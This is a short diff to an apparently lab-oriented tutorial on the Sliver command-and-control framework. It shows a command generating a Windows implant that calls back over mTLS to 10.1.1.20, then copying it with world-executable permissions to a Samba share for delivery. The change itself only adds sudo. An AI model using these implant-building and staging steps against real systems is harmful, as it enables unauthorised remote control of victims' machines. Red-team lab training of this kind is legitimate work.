@@ -36,7 +36,7 @@ generate --mtls 10.1.1.20 --os windows --arch amd64 --format exe
 ```
 When you create your implants, move them to the `/srv/sliver` folder on the Sliver server and change the permissions to allow execution in the commands below. Make sure you exit the sliver prompt by typing in `exit`.
 ```
-cp ./<RANDOM_NAME>.exe /srv/sliver/
+sudo cp ./<RANDOM_NAME>.exe /srv/sliver/
 sudo chmod 777 /srv/sliver/<RANDOM_NAME>.exe
 ```
 The `cp` command means copy and it copies the executable you just created to a directory /srv/sliver. For the nerds out there, a SAMBA server is running on the Ubuntu system that allows Windows systems to navigate to the executable using network shares.
